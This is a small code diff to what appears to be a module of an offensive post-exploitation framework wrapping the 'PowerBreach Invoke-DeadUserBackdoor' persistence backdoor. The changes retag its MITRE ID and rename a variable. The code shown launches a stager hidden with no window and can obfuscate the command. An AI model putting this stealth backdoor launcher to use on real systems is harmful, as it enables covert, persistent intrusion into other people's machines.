@@ -20,7 +20,7 @@ class Module(object):
 
             'Software': '',
 
-            'Techniques': ['TA0003'],
+            'Techniques': ['T1098'],
 
             'Background' : False,
 
@@ -203,8 +203,8 @@ Invoke-DeadUserBackdoor"""
         parts = stagerCode.split(" ")
 
         # set up the start-process command so no new windows appears
-        scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-DeadUserBackdoor started'" % (parts[0], " ".join(parts[1:]))
+        script = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-DeadUserBackdoor started'" % (parts[0], " ".join(parts[1:]))
         if obfuscate:
-            scriptLauncher = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
 
-        return scriptLauncher
+        return script
